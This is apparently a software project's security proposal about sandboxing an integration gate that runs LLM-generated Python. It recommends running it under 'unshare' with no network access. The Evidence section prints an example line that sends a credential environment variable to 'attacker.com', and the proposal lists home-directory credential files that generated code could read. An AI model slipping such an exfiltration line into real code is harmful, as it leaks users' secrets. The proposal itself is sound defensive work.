---
number: "195"
title: Integration gate subprocess runs as current user with no namespace isolation
severity: medium
status: proposed
kind: improvement
author: claude
date: "2026-05-19"
tags: [gate, security, integration, sandbox]
related: ["188"]
---

## Summary

`evaluate_integration` (gate/integration.py) writes model-generated Python files to a temp directory and executes them via `importlib` in a subprocess. BC-188 (path traversal sandboxing) is implemented and closes the file-escape vector. The residual risk: the subprocess runs as the current user with full network access and full read access to the user's home directory (including `~/.config/factory/credentials.yaml` and whatever `~/.bashrc` exports).

The path-traversal guard prevents the generated code from writing outside the sandbox. It does not prevent the generated code from:
- Making outbound network requests (credential exfiltration)
- Reading `~/.bashrc`, `~/.claude.json`, `~/.config/` (credential exposure)
- Consuming unbounded CPU or memory

## Evidence

`gate/integration.py` runs the integration subprocess via `factory.subprocess.run`, which inherits the parent's user context. `gate_subprocess_env` strips explicit env vars but the filesystem is fully visible.

A model producing:
```python
import urllib.request, os
urllib.request.urlopen(f"http://attacker.com/?k={os.environ.get('MEMORY_DSN','')}")
```
inside `__init__.py` would execute successfully and exfiltrate credentials.

This is not a theoretical concern — the integration gate explicitly executes LLM-generated code, and the adversarial prompt surface includes the model channel itself.

## Proposed fix

Run the integration subprocess under Linux namespace isolation using `unshare`:

```python
# --net: no outbound network
# --user: map to nobody inside the sandbox
cmd = ["unshare", "--net", "--user", "--map-nobody", sys.executable, "-c", ...]
```

`unshare` is available on Ubuntu/Debian without additional packages. This eliminates the network exfiltration vector entirely. Filesystem read access can be further restricted with `--mount` + bind mounts, but `--net` alone addresses the highest-risk vector (credential exfiltration).

## Acceptance criteria

- AC-1: Integration subprocess cannot make outbound network connections.
- AC-2: `unshare` availability is checked at startup; graceful degradation with a `warnings.warn` if unavailable (e.g., containers without user-namespace support).
- AC-3: Regression test: a generated `__init__.py` that attempts `urllib.request.urlopen(...)` fails with a network error, not a silent success.
- AC-4: Existing integration gate tests continue to pass.

## Links

- BC-188 — path traversal sandboxing (implemented; closes the write-escape vector)
- GLM adversarial review 2026-05-19, items #1 and #9 — flagged this as the primary residual security risk
